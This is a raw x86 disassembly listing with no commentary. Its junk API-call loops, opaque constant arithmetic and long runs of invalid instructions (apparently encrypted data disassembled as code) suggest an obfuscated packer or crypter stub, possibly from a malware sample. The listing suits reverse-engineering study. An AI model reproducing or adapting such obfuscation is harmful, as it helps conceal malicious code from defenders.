  4037f1:	mov    di,WORD PTR [ebp-0x2c]
  4037f5:	mov    ebx,0x8a40
  4037fa:	xor    di,bx
  4037fd:	add    di,dx
  403800:	movzx  edx,di
  403803:	mov    edi,DWORD PTR [ebp-0x8]
  403806:	xor    edi,ecx
  403808:	lea    edx,[edx+edi*1+0x32729d]
  40380f:	add    DWORD PTR [eax],edx
  403811:	mov    eax,DWORD PTR [ebp-0x20]
  403814:	mov    edx,DWORD PTR [ebp-0x8]
  403817:	mov    edi,DWORD PTR [ebp-0x24]
  40381a:	xor    edx,ecx
  40381c:	add    edx,esi
  40381e:	imul   edx,edi
  403821:	sub    DWORD PTR [eax],edx
  403823:	mov    eax,DWORD PTR [ebp-0x14]
  403826:	jmp    0x4028b3
  40382b:	mov    eax,DWORD PTR [ebp-0xc]
  40382e:	mov    edx,DWORD PTR [ebp-0x18]
  403831:	xor    eax,edx
  403833:	cmp    eax,0x7aa80c5f
  403838:	je     0x402858
  40383e:	mov    eax,DWORD PTR [ebp-0x10]
  403841:	add    DWORD PTR [eax],0x7403501
  403847:	jmp    0x402858
  40384c:	mov    eax,DWORD PTR [ebp-0x1c]
  40384f:	cmp    DWORD PTR [eax],edi
  403851:	je     0x402858
  403857:	mov    eax,0x800f1c9a
  40385c:	jmp    0x4028b7
  403861:	push   ebp
  403862:	mov    ebp,esp
  403864:	sub    esp,0x44
  403867:	push   edi
  403868:	mov    eax,DWORD PTR [ebp+0xc]
  40386b:	and    DWORD PTR ds:0x430626,0x265f
  403875:	mov    DWORD PTR [ebp-0x10],eax
  403878:	mov    eax,DWORD PTR [ebp+0x8]
  40387b:	and    DWORD PTR ds:0x42e8e6,0x0
  403885:	jmp    0x403899
  40388a:	xor    ecx,ecx
  40388c:	or     ecx,DWORD PTR ds:0x42e8e6
  403892:	inc    ecx
  403893:	mov    DWORD PTR ds:0x42e8e6,ecx
  403899:	cmp    DWORD PTR ds:0x42e8e6,0x12
  4038a0:	jae    0x4038db
  4038a6:	cmp    DWORD PTR ds:0x42e8e6,0x5
  4038ad:	jne    0x4038bc
  4038b3:	push   DWORD PTR [ebp-0x14]
  4038b6:	call   DWORD PTR ds:0x42eb5c
  4038bc:	cmp    DWORD PTR ds:0x42e8e6,0x4
  4038c3:	jne    0x4038d6
  4038c9:	mov    ecx,DWORD PTR ds:0x42e8e6
  4038cf:	inc    ecx
  4038d0:	mov    DWORD PTR ds:0x42e8e6,ecx
  4038d6:	jmp    0x40388a
  4038db:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4038e2:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  4038e9:	mov    edx,DWORD PTR [ebp+0x8]
  4038ec:	and    DWORD PTR ds:0x42efa8,0x0
  4038f6:	mov    edi,DWORD PTR ds:0x42efa8
  4038fc:	inc    edi
  4038fd:	mov    DWORD PTR ds:0x42efa8,edi
  403903:	cmp    DWORD PTR ds:0x42efa8,0x4
  40390a:	jne    0x403920
  403910:	push   0x1500
  403915:	push   0x3962
  40391a:	call   DWORD PTR ds:0x42eb74
  403920:	cmp    DWORD PTR ds:0x42efa8,0x3
  403927:	jne    0x40393a
  40392d:	mov    edi,DWORD PTR ds:0x42efa8
  403933:	inc    edi
  403934:	mov    DWORD PTR ds:0x42efa8,edi
  40393a:	cmp    DWORD PTR ds:0x42efa8,0x18
  403941:	jb     0x4038f6
  403947:	and    DWORD PTR ds:0x42ef9c,0x0
  403951:	jmp    0x403963
  403956:	mov    ecx,DWORD PTR ds:0x42ef9c
  40395c:	inc    ecx
  40395d:	mov    DWORD PTR ds:0x42ef9c,ecx
  403963:	cmp    DWORD PTR ds:0x42ef9c,0x11
  40396a:	jae    0x4039ad
  403970:	cmp    DWORD PTR ds:0x42ef9c,0x4
  403977:	jne    0x403988
  40397d:	push   0x5572
  403982:	call   DWORD PTR ds:0x42ed1c
  403988:	cmp    DWORD PTR ds:0x42ef9c,0x3
  40398f:	jne    0x4039a2
  403995:	mov    ecx,DWORD PTR ds:0x42ef9c
  40399b:	inc    ecx
  40399c:	mov    DWORD PTR ds:0x42ef9c,ecx
  4039a2:	jmp    0x403956
  4039a7:	add    ecx,0x3d2b
  4039ad:	mov    DWORD PTR [ebp-0x40],eax
  4039b0:	xor    DWORD PTR ds:0x42ef94,ebx
  4039b6:	mov    eax,0x7510856
  4039bb:	xor    edx,eax
  4039bd:	mov    ecx,0x32729d
  4039c2:	or     edi,DWORD PTR ds:0x430626
  4039c8:	add    edx,ecx
  4039ca:	adc    DWORD PTR ds:0x43060e,ebx
  4039d0:	mov    DWORD PTR [ebp-0x8],edx
  4039d3:	mov    edx,DWORD PTR [ebp+0x8]
  4039d6:	mov    DWORD PTR ds:0x43062a,0x1d
  4039e0:	cmp    DWORD PTR ds:0x43062a,0x0
  4039e7:	je     0x403a1f
  4039ed:	cmp    DWORD PTR ds:0x43062a,0x2c
  4039f4:	jne    0x403a03
  4039fa:	push   DWORD PTR [ebp-0x14]
  4039fd:	call   DWORD PTR ds:0x42eb60
  403a03:	mov    edi,DWORD PTR ds:0x43062a
  403a09:	dec    edi
  403a0a:	mov    DWORD PTR ds:0x43062a,edi
  403a10:	jmp    0x4039e0
  403a15:	adc    DWORD PTR ds:0x42efb0,0x29f8
  403a1f:	xor    edx,eax
  403a21:	xor    edi,DWORD PTR ds:0x43062a
  403a27:	add    edx,ecx
  403a29:	mov    DWORD PTR [ebp+0xc],edx
  403a2c:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  403a33:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403a3a:	mov    DWORD PTR [ebp-0x2c],0xf89c8530
  403a41:	and    DWORD PTR ds:0x4306da,0x0
  403a4b:	mov    edx,DWORD PTR ds:0x4306da
  403a51:	inc    edx
  403a52:	mov    DWORD PTR ds:0x4306da,edx
  403a58:	cmp    DWORD PTR ds:0x4306da,0x2b
  403a5f:	jne    0x403a77
  403a65:	push   0x85b9
  403a6a:	push   0x0
  403a6c:	push   0x24c3
  403a71:	call   DWORD PTR ds:0x42eb78
  403a77:	cmp    DWORD PTR ds:0x4306da,0x1e
  403a7e:	jb     0x403a4b
  403a84:	adc    edi,0xfa7
  403a8a:	mov    DWORD PTR [ebp-0x30],0xf89c8531
  403a91:	or     edi,0x30ac
  403a97:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  403a9e:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  403aa5:	xor    DWORD PTR ds:0x4306c2,ebx
  403aab:	mov    DWORD PTR [ebp-0x3c],0xf89c853c
  403ab2:	mov    edx,DWORD PTR [ebp+0x8]
  403ab5:	xor    edx,eax
  403ab7:	mov    edi,DWORD PTR [ebp-0x10]
  403aba:	add    edx,ecx
  403abc:	cmp    edi,edx
  403abe:	mov    DWORD PTR ds:0x42e8da,0x7baa
  403ac8:	je     0x4052e2
  403ace:	mov    DWORD PTR ds:0x4306ca,0x2abe
  403ad8:	push   ebx
  403ad9:	mov    DWORD PTR ds:0x43060a,0x536a
  403ae3:	jmp    0x4052bd
  403ae8:	mov    edi,DWORD PTR ds:0x430712
  403aee:	mov    edx,DWORD PTR ds:0x42eb30
  403af4:	sub    edx,edi
  403af6:	or     edi,DWORD PTR [edi+edx*1]
  403af9:	mov    edx,DWORD PTR [ebp-0x8]
  403afc:	sub    DWORD PTR ds:0x430632,edx
  403b02:	mov    edi,DWORD PTR [ebp-0x10]
  403b05:	xor    DWORD PTR ds:0x42ef9c,0x6f7b
  403b0f:	sub    edi,edx
  403b11:	and    DWORD PTR ds:0x43062a,0x0
  403b1b:	mov    edx,DWORD PTR ds:0x43062a
  403b21:	inc    edx
  403b22:	mov    DWORD PTR ds:0x43062a,edx
  403b28:	cmp    DWORD PTR ds:0x43062a,0xa
  403b2f:	jne    0x403b43
  403b35:	push   DWORD PTR [ebp-0x20]
  403b38:	push   0x8b6b
  403b3d:	call   DWORD PTR ds:0x42ec40
  403b43:	cmp    DWORD PTR ds:0x43062a,0x9
  403b4a:	jne    0x403b5d
  403b50:	mov    edx,DWORD PTR ds:0x43062a
  403b56:	inc    edx
  403b57:	mov    DWORD PTR ds:0x43062a,edx
  403b5d:	cmp    DWORD PTR ds:0x43062a,0x14
  403b64:	jb     0x403b1b
  403b6a:	mov    DWORD PTR ds:0x4306c2,0x73d7
  403b74:	mov    edx,DWORD PTR [ebp-0x4]
  403b77:	and    DWORD PTR ds:0x430612,0x4306d2
  403b81:	xor    edx,eax
  403b83:	xor    DWORD PTR ds:0x43060e,0x6fac
  403b8d:	add    edx,ecx
  403b8f:	mov    DWORD PTR ds:0x43060a,0x698f
  403b99:	cmp    edi,edx
  403b9b:	mov    DWORD PTR ds:0x430642,0x4dce
  403ba5:	jb     0x4052e1
  403bab:	add    DWORD PTR ds:0x42efa0,0x380f
  403bb5:	mov    edx,DWORD PTR [ebp-0x28]
  403bb8:	add    edi,edi
  403bba:	mov    edi,DWORD PTR [ebp-0x4]
  403bbd:	xor    ebx,ebx
  403bbf:	add    ebx,DWORD PTR ds:0x42efb0
  403bc5:	and    ebx,DWORD PTR ds:0x4306d2
  403bcb:	mov    DWORD PTR ds:0x42efb0,ebx
  403bd1:	xor    edx,eax
  403bd3:	and    DWORD PTR ds:0x42e8da,0x0
  403bdd:	mov    ebx,DWORD PTR ds:0x42e8da
  403be3:	inc    ebx
  403be4:	mov    DWORD PTR ds:0x42e8da,ebx
  403bea:	cmp    DWORD PTR ds:0x42e8da,0x28
  403bf1:	jne    0x403c05
  403bf7:	push   DWORD PTR [ebp-0x10]
  403bfa:	push   0x85bf
  403bff:	call   DWORD PTR ds:0x42eb7c
  403c05:	cmp    DWORD PTR ds:0x42e8da,0x1d
  403c0c:	jb     0x403bdd
  403c12:	sbb    DWORD PTR ds:0x430642,0x42d2
  403c1c:	xor    edi,eax
  403c1e:	add    edi,ecx
  403c20:	mov    DWORD PTR ds:0x43060e,0x1a
  403c2a:	cmp    DWORD PTR ds:0x43060e,0x0
  403c31:	je     0x403c83
  403c37:	cmp    DWORD PTR ds:0x43060e,0xc
  403c3e:	jne    0x403c4d
  403c44:	push   DWORD PTR [ebp-0x18]
  403c47:	call   DWORD PTR ds:0x42eb80
  403c4d:	cmp    DWORD PTR ds:0x43060e,0xd
  403c54:	jne    0x403c67
  403c5a:	mov    ebx,DWORD PTR ds:0x43060e
  403c60:	dec    ebx
  403c61:	mov    DWORD PTR ds:0x43060e,ebx
  403c67:	mov    ebx,DWORD PTR ds:0x43060e
  403c6d:	dec    ebx
  403c6e:	mov    DWORD PTR ds:0x43060e,ebx
  403c74:	jmp    0x403c2a
  403c79:	sbb    DWORD PTR ds:0x4306ce,0x12f8
  403c83:	add    edx,ecx
  403c85:	sbb    DWORD PTR ds:0x4306ca,0x430642
  403c8f:	imul   edx,edi
  403c92:	xor    ebx,DWORD PTR ds:0x430606
  403c98:	mov    edi,DWORD PTR [ebp-0x8]
  403c9b:	add    ebx,DWORD PTR ds:0x4306ca
  403ca1:	mov    ebx,DWORD PTR [ebp-0x10]
  403ca4:	sub    ebx,edi
  403ca6:	mov    DWORD PTR ds:0x42efa4,0x5446
  403cb0:	cmp    ebx,edx
  403cb2:	mov    DWORD PTR ds:0x43060a,0x67f
  403cbc:	ja     0x403cd8
  403cc2:	mov    edx,DWORD PTR [ebp-0x4]
  403cc5:	xor    edx,eax
  403cc7:	or     DWORD PTR ds:0x43062e,0x5676
  403cd1:	add    edx,ecx
  403cd3:	jmp    0x404621
  403cd8:	mov    edx,DWORD PTR [ebp-0x2c]
  403cdb:	mov    edi,DWORD PTR [ebp-0x4]
  403cde:	xor    edx,eax
  403ce0:	xor    edi,eax
  403ce2:	mov    ebx,DWORD PTR ds:0x42e8f6
  403ce8:	adc    DWORD PTR ds:0x42ef90,ebx
  403cee:	add    edi,ecx
  403cf0:	add    edx,ecx
  403cf2:	imul   edx,edi
  403cf5:	mov    edi,DWORD PTR ds:0x43062a
  403cfb:	sbb    DWORD PTR ds:0x42e8ee,edi
  403d01:	mov    edi,DWORD PTR [ebp-0x8]
  403d04:	or     ebx,0x29ff
  403d0a:	mov    ebx,DWORD PTR [ebp-0x10]
  403d0d:	sub    ebx,edi
  403d0f:	cmp    ebx,edx
  403d11:	ja     0x403ec9
  403d17:	jmp    0x403ec1
  403d1c:	jmp    0x6c13:0x697351b5
  403d23:	ins    DWORD PTR es:[edi],dx
  403d24:	imul   esp,DWORD PTR [eax-0x38c0cd93],0xffffff98
  403d2b:	adc    eax,0x7e7e11b6
  403d30:	mov    edi,DWORD PTR [edi+0x7e]
  403d33:	jle    0x403cff
  403d35:	cmc    
  403d36:	and    al,0x3f
  403d38:	imul   BYTE PTR ds:0x579595c0
  403d3e:	mov    dh,0xff
  403d40:	into   
  403d41:	push   eax
  403d42:	das    
  403d43:	aad    0x6c
  403d45:	push   ds
  403d46:	in     al,dx
  403d47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d48:	test   al,0x17
  403d4a:	jl     0x403d05
  403d4c:	je     0x403d65
  403d4e:	loop   0x403d8d
  403d50:	ret    0xf2dd
  403d53:	mov    edx,0xe8074be6
  403d58:	stos   DWORD PTR es:[edi],eax
  403d59:	sbb    eax,0x7ce1213c
  403d5e:	push   0x63
  403d60:	das    
  403d61:	sahf   
  403d62:	xor    al,0x13
  403d64:	(bad)  
  403d65:	jmp    0xeca3f88a
  403d6a:	pop    edi
  403d6b:	and    BYTE PTR [eax+0x1febf2b],ch
  403d71:	xlat   BYTE PTR ds:[ebx]
  403d72:	pop    esi
  403d73:	daa    
  403d74:	and    BYTE PTR [ebp+0x4becb42e],dl
  403d7a:	ds push ds
  403d7c:	xor    eax,0x365a5e0e
  403d81:	push   0x4b
  403d83:	pop    ebx
  403d84:	das    
  403d85:	mov    al,ds:0x212e13a9
  403d8a:	add    dh,BYTE PTR [ebp-0x3793ce12]
  403d90:	int3   
  403d91:	pushf  
  403d92:	pushf  
  403d93:	in     al,dx
  403d94:	cmp    ecx,DWORD PTR [esi-0x5912224e]
  403d9a:	mov    BYTE PTR [edx+0x1d],bh
  403d9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d9e:	cs shl eax,1
  403da1:	std    
  403da2:	inc    esi
  403da3:	lea    esi,[ebx+0x12f95b4c]
  403da9:	fmul   st(4),st
  403dab:	sub    edx,eax
  403dad:	adc    DWORD PTR [ebx+ebx*2+0x40],eax
  403db1:	sub    DWORD PTR [ebp+0xe],esp
  403db4:	push   ecx
  403db5:	es (bad) 
  403db8:	adc    BYTE PTR [edx-0x36],0xe9
  403dbc:	aas    
  403dbd:	jbe    0x403df6
  403dbf:	call   0xc5faf6a4
  403dc4:	xchg   ebx,eax
  403dc5:	mov    al,0xcb
  403dc7:	call   0x73cb:0x725d855f
  403dce:	xor    DWORD PTR [edi],esi
  403dd0:	aam    0xe3
  403dd2:	call   0x7a372556
  403dd7:	js     0x403d9f
  403dd9:	pop    edx
  403dda:	xchg   esi,eax
  403ddb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ddc:	pop    ebp
  403ddd:	mov    ebp,0x4bb836e3
  403de2:	or     eax,0x1858032
  403de7:	bound  edi,QWORD PTR [edi-0x8]
  403dea:	(bad)  
  403deb:	xchg   ecx,eax
  403dec:	push   0xffffffb0
  403dee:	mov    ds:0x472515bb,eax
  403df3:	jmp    0x403db3
  403df5:	push   es
  403df6:	ds mov bh,0x58
  403df9:	sub    ebx,DWORD PTR [edx+0x5b1d5732]
  403dff:	mov    bl,0xe7
  403e01:	(bad)  
  403e02:	out    0xe,eax
  403e04:	xor    ch,BYTE PTR [edi-0x3bd45679]
  403e0a:	push   0x614da9d8
  403e0f:	or     bh,ah
  403e11:	nop
  403e12:	push   ss
  403e13:	sbb    al,BYTE PTR [eax]
  403e15:	mov    bh,0x7e
  403e17:	jg     0x403e62
  403e19:	in     al,0xb5
  403e1b:	imul   BYTE PTR [esi+0x11]
  403e1e:	shl    DWORD PTR [ecx-0x15],1
  403e21:	mov    ds:0xf6f33b65,eax
  403e26:	popf   
  403e27:	inc    edi
  403e28:	js     0x403de4
  403e2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e2b:	pop    esi
  403e2c:	jl     0x403e0c
  403e2e:	xchg   ecx,eax
  403e2f:	dec    esp
  403e30:	push   ebx
  403e31:	push   es
  403e32:	rol    eax,cl
  403e34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e35:	aaa    
  403e36:	mov    esp,0x19b932fe
  403e3b:	test   eax,0x3f25730b
  403e40:	int3   
  403e41:	cmp    bl,dh
  403e43:	pop    esp
  403e44:	out    0xdb,al
  403e46:	mov    ebp,0xad19ccd1
  403e4b:	dec    ebx
  403e4c:	repz imul ecx,DWORD PTR es:[esi+eiz*4],0xa3aa1d48
  403e55:	push   eax
  403e56:	ins    DWORD PTR es:[edi],dx
  403e57:	xor    al,0xbc
  403e59:	daa    
  403e5a:	add    al,0x9c
  403e5c:	fistp  QWORD PTR [esi+edx*8+0x5c]
  403e60:	cmp    al,0x42
  403e62:	sahf   
  403e63:	xchg   ecx,eax
  403e64:	push   ebp
  403e65:	test   DWORD PTR [ebx+0x7a],ebp
  403e68:	pop    esi
  403e69:	add    eax,0x48be6d1e
  403e6e:	test   DWORD PTR [edi],edx
  403e70:	jbe    0x403e72
  403e72:	pusha  
  403e73:	mov    ch,0xb6
  403e75:	out    dx,al
  403e76:	pop    esi
  403e77:	rcr    BYTE PTR [edx+0x19],0xd8
  403e7b:	pop    esi
  403e7c:	cwde   
  403e7d:	mov    al,BYTE PTR ds:0x4921f3ef
  403e83:	and    bl,BYTE PTR [ecx+0x56204bd8]
  403e89:	ins    BYTE PTR es:[edi],dx
  403e8a:	jp     0x403e9f
  403e8c:	jbe    0x403e2e
  403e8e:	adc    al,0x89
  403e90:	(bad)  
  403e91:	mov    ebp,0xb7bb456f
  403e96:	int    0xc6
  403e98:	retf   0xfecb
  403e9b:	mov    db3,eax
  403e9e:	mov    bh,0x7f
  403ea0:	or     esi,esi
  403ea2:	ins    DWORD PTR es:[edi],dx
  403ea3:	into   
  403ea4:	ins    BYTE PTR es:[edi],dx
  403ea5:	pop    esi
  403ea6:	push   ecx
  403ea7:	or     BYTE PTR [esi],bl
  403ea9:	rol    ecx,1
  403eab:	mov    DWORD PTR [ebp+ebx*1-0x3e5c25ed],ebp
  403eb2:	jmp    0x403e8e
  403eb4:	adc    al,0xe5
  403eb6:	add    DWORD PTR [eax+ebp*1-0x388d4b08],ebx
  403ebd:	rol    esp,1
  403ebf:	pop    ebx
  403ec0:	mov    ch,0x8b
  403ec2:	push   ebp
  403ec3:	fsubr  st,st(1)
  403ec5:	dec    edx
  403ec6:	pop    es
  403ec7:	add    BYTE PTR [eax],al
  403ec9:	mov    edx,DWORD PTR [ebp-0x30]
  403ecc:	mov    edi,DWORD PTR [ebp-0x4]
  403ecf:	xor    edx,eax
  403ed1:	xor    edi,eax
  403ed3:	add    edi,ecx
  403ed5:	add    edx,ecx
  403ed7:	imul   edx,edi
  403eda:	mov    edi,DWORD PTR [ebp-0x8]
  403edd:	mov    ebx,DWORD PTR [ebp-0x10]
  403ee0:	sub    ebx,edi
  403ee2:	cmp    ebx,edx
  403ee4:	ja     0x40409c
  403eea:	jmp    0x404094
  403eef:	ror    BYTE PTR [ebx],cl
  403ef1:	push   edi
  403ef2:	mov    dh,0x57
  403ef4:	push   0xffffffd3
  403ef6:	stos   DWORD PTR es:[edi],eax
  403ef7:	mov    ds:0xf17278c4,al
  403efc:	mov    ds:0x13c3775a,eax
  403f01:	jle    0x403f81
  403f03:	mov    edi,DWORD PTR [edi+0x7e]
  403f06:	jle    0x403f54
  403f08:	mov    ds:0xd97604ff,al
  403f0d:	push   cs
  403f0e:	cdq    
  403f0f:	or     BYTE PTR [ebp+eax*4+0x32624a5b],cl
  403f16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f17:	mov    bl,BYTE PTR [edx]
  403f19:	pop    es
  403f1a:	dec    eax
  403f1b:	jbe    0x403f74
  403f1d:	push   ebx
  403f1e:	pop    ebx
  403f1f:	scas   al,BYTE PTR es:[edi]
  403f20:	jge    0x403eae
  403f22:	fwait
  403f23:	ins    BYTE PTR es:[edi],dx
  403f24:	out    0xfd,eax
  403f26:	push   ds
  403f27:	sbb    ah,BYTE PTR [esi-0x2fe73674]
  403f2d:	pop    ds
  403f2e:	aaa    
  403f2f:	aam    0xc6
  403f31:	mov    dl,0x2e
  403f33:	iret   
  403f34:	(bad)  
  403f36:	das    
  403f37:	dec    ebp
  403f38:	cs fwait
  403f3a:	std    
  403f3b:	add    dh,BYTE PTR [ecx-0xcb0ea1a]
  403f41:	xlat   BYTE PTR ds:[ebx]
  403f42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f43:	int    0xed
  403f45:	test   al,0x4a
  403f47:	pop    ebx
  403f48:	call   0x53e7:0xa35f32a
  403f4f:	ror    DWORD PTR [ebx+0x3a],cl
  403f52:	dec    edx
  403f53:	xor    bh,BYTE PTR [esi]
  403f55:	jns    0x403f80
  403f57:	ja     0x403fc9
  403f59:	aaa    
  403f5a:	not    dh
  403f5c:	in     eax,dx
  403f5d:	inc    esp
  403f5e:	mov    ebx,0x9e261ee6
  403f63:	adc    BYTE PTR [ecx+0x23],0x9a
  403f67:	jns    0x403f83
  403f69:	and    al,0xb9
  403f6b:	or     bh,BYTE PTR [ebx]
  403f6d:	mov    al,ds:0x2548204c
  403f72:	cwde   
  403f73:	jle    0x403efc
  403f75:	xchg   ecx,eax
  403f76:	je     0x403f97
  403f78:	mov    al,ds:0x5b374598
  403f7d:	jb     0x403fe9
  403f7f:	loope  0x403fb4
  403f81:	push   ecx
  403f82:	jnp    0x403fdc
  403f84:	dec    edi
  403f85:	sti    
  403f86:	pop    eax
  403f87:	xor    al,0x69
  403f89:	iret   
  403f8a:	gs xchg edx,eax
  403f8c:	xor    al,0xf0
  403f8e:	fwait
  403f8f:	in     eax,0x9a
  403f91:	sbb    ah,BYTE PTR [ebx]
  403f93:	scas   eax,DWORD PTR es:[edi]
  403f94:	pop    ebx
  403f95:	or     al,0x1b
  403f97:	and    BYTE PTR [ebx],ah
  403f99:	pop    ss
  403f9a:	popf   
  403f9b:	dec    ebp
  403f9c:	clc    
  403f9d:	(bad)  
  403f9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f9f:	and    ah,ah
  403fa1:	fist   DWORD PTR [edi]
  403fa3:	shl    BYTE PTR [edx-0x70b5a2c5],cl
  403fa9:	stos   DWORD PTR es:[edi],eax
  403faa:	not    BYTE PTR [edi+edi*4-0x5fa17981]
  403fb1:	jmp    0xfc4ac616
  403fb6:	out    0x14,eax
  403fb8:	cmp    eax,0xf3a4628e
  403fbd:	lock push DWORD PTR [esi]
  403fc0:	lods   eax,DWORD PTR ds:[esi]
  403fc1:	retf   
  403fc2:	xor    BYTE PTR [edi-0x5dd5efe8],dh
  403fc8:	xor    ebp,esi
  403fca:	sub    DWORD PTR [esi-0x29],eax
  403fcd:	(bad)  
  403fce:	mov    ebp,0x65f731ac
  403fd3:	test   eax,0x1230b5f1
  403fd8:	mov    ebx,0x4a83222c
  403fdd:	addr16 (bad) 
  403fe0:	and    dh,cl
  403fe2:	call   0x371b:0xfe260551
  403fe9:	leave  
  403fea:	out    0x5e,al
  403fec:	xchg   ebp,eax
  403fed:	inc    esp
  403fee:	adc    esp,0x2501b452
  403ff4:	cmp    DWORD PTR [edx],edx
  403ff6:	(bad)  [ebx-0x1e0b9b63]
  403ffc:	js     0x404067
  403ffe:	aam    0x19
  404000:	call   0x70de:0xbf59a6ca
  404007:	or     al,0x79
  404009:	xor    al,0xf3
  40400b:	cmp    ebx,DWORD PTR [edx-0x39]
  40400e:	imul   eax,DWORD PTR [esi+0x14],0xf99669a
  404015:	dec    edx
  404016:	out    dx,eax
  404017:	or     BYTE PTR [ebx-0x7e],cl
  40401a:	jge    0x403fc1
  40401c:	or     eax,0x501a5242
  404021:	test   al,0x59
  404023:	xchg   ebx,eax
  404024:	add    bh,ch
  404026:	ret    0x876b
  404029:	sbb    DWORD PTR [edi+edx*1],ecx
  40402c:	jbe    0x4040a7
  40402e:	loope  0x404054
  404030:	cmp    al,0xb5
  404032:	aas    
  404033:	scas   eax,DWORD PTR es:[edi]
  404034:	adc    BYTE PTR [edx+ebp*8+0x45],ah
  404038:	pop    eax
  404039:	scas   eax,DWORD PTR es:[edi]
  40403a:	out    0x96,eax
  40403c:	mov    eax,0x8a10ea2d
  404041:	xlat   BYTE PTR ds:[ebx]
  404042:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404043:	cmp    al,0xa
  404045:	sbb    ebp,ecx
  404047:	add    DWORD PTR [ebx+ebx*2-0x9d2fa94],edx
  40404e:	xor    BYTE PTR [ebx-0x19],bl
  404051:	mov    ds:0x423071be,eax
  404056:	fidiv  DWORD PTR [esi+0x63ccaacd]
  40405c:	pop    ecx
  40405d:	push   esp
  40405e:	xor    ch,0xac
  404061:	push   ebx
  404062:	xchg   ebp,esi
  404064:	daa    
  404065:	xor    BYTE PTR [ebx+0x60dc35ae],bh
  40406b:	ss push eax
  40406d:	lds    edx,FWORD PTR [ecx+0x7f6f8228]
  404073:	xchg   ecx,eax
  404074:	mov    ebx,0x4e59ed5f
  404079:	adc    esi,DWORD PTR [eax+0x21]
  40407c:	fmul   DWORD PTR [ebx-0x11]
  40407f:	mov    eax,ds:0x475344a
  404084:	cmp    esp,DWORD PTR [edx]
  404086:	mov    dl,0x68
  404088:	ret    0xa218
  40408b:	repnz test DWORD PTR [esi],0x11a097d2
  404092:	mov    ebp,eax
  404094:	mov    edx,DWORD PTR [ebp-0x2c]
  404097:	jmp    0x404613
  40409c:	mov    edx,DWORD PTR [ebp-0x34]
  40409f:	mov    edi,DWORD PTR [ebp-0x4]
  4040a2:	jmp    0x40424c
  4040a7:	fs bswap eax
  4040aa:	popf   
  4040ab:	ins    DWORD PTR es:[edi],dx
  4040ac:	pop    ebp
  4040ad:	gs out 0x68,eax
  4040b0:	xchg   ebp,eax
  4040b1:	pop    DWORD PTR [eax+0x1fe68c89]
  4040b7:	push   eax
  4040b8:	adc    al,0x7e
  4040ba:	jle    0x404047
  4040bc:	jg     0x40413c
  4040be:	jle    0x4040d4
  4040c0:	outs   dx,DWORD PTR es:[esi]
  4040c2:	pop    edi
  4040c3:	mov    eax,ds:0xaf47f8b7
  4040c8:	in     al,0x5e
  4040ca:	vmaxss xmm4,xmm4,xmm7
  4040ce:	(bad)  
  4040cf:	stos   DWORD PTR es:[edi],eax
  4040d0:	ds xchg bl,al
  4040d3:	in     al,dx
  4040d4:	iret   
  4040d5:	push   ebp
  4040d6:	scas   al,BYTE PTR es:[edi]
  4040d7:	mov    edx,0x1b3de310
  4040dc:	xchg   ebx,eax
  4040dd:	icebp  
  4040de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040df:	push   esi
  4040e0:	jecxz  0x40407d
  4040e2:	cs mov ebx,0xdb54c475
  4040e8:	sub    edi,DWORD PTR [edi]
  4040ea:	mul    bh
  4040ec:	(bad)  
  4040ed:	out    0x6d,al
  4040ef:	mov    ebp,edi
  4040f1:	add    eax,0xea83adc0
  4040f6:	pop    ebx
  4040f7:	inc    ebx
  4040f8:	mov    esi,0x3212cf0c
  4040fd:	(bad)  
  4040fe:	mov    al,ds:0xe1d7f2f1
  404103:	jmp    0x1a44a2b5
  404108:	in     al,0x96
  40410a:	xchg   esi,eax
  40410b:	push   ebx
  40410c:	pushf  
  40410d:	sub    esp,edx
  40410f:	cs psubq mm6,mm5
  404113:	jecxz  0x40413a
  404115:	pushf  
  404116:	cs loope 0x40414b
  404119:	jmp    0x1020:0x9567d11
  404120:	in     eax,dx
  404121:	or     edx,DWORD PTR [ebp-0x48]
  404124:	add    DWORD PTR [eiz*2-0x39d2b843],edx
  40412b:	scas   al,BYTE PTR es:[edi]
  40412c:	or     ebx,edi
  40412e:	xchg   edi,eax
  40412f:	inc    ebp
  404130:	ror    BYTE PTR [ecx],1
  404132:	hlt    
  404133:	cli    
  404134:	arpl   ax,dx
  404136:	int3   
  404137:	xor    ch,dl
  404139:	pop    edx
  40413a:	loopne 0x4040da
  40413c:	ss gs fmul st(3),st
  404140:	ins    DWORD PTR es:[edi],dx
  404141:	cs stos BYTE PTR es:[edi],al
  404143:	mov    esp,0xcf43151e
  404148:	push   ebp
  404149:	outs   dx,BYTE PTR ds:[esi]
  40414a:	jb     0x4040eb
  40414c:	mov    ch,0xfd
  40414e:	jne    0x40411f
  404150:	jo     0x4040e8
  404152:	fwait
  404153:	inc    ebp
  404154:	xchg   ecx,eax
  404155:	mov    eax,0x3e21f8f9
  40415a:	dec    eax
  40415b:	pop    esi
  40415c:	xchg   edx,eax
  40415d:	pop    ecx
  40415e:	pop    ebx
  40415f:	xchg   edi,eax
  404160:	pop    ds
  404161:	popf   
  404162:	sub    eax,0xb782417b
  404167:	dec    edi
  404168:	pop    esi
  404169:	fwait
  40416a:	dec    eax
  40416b:	cs stos BYTE PTR es:[edi],al
  40416d:	cld    
  40416e:	add    edi,DWORD PTR [ebx]
  404170:	stos   BYTE PTR es:[edi],al
  404171:	push   ds
  404172:	cmp    eax,0x9f917bb8
  404177:	aas    
  404178:	jmp    esp
  40417a:	ret    0x92f6
  40417d:	vaddpd xmm2,xmm6,XMMWORD PTR [edx+0x3fa602bd]
  404185:	call   0x560:0x4f65ec4c
  40418c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40418d:	sub    BYTE PTR [esi],dh
  40418f:	xor    bl,BYTE PTR [edx+0x1b]
  404192:	push   cs
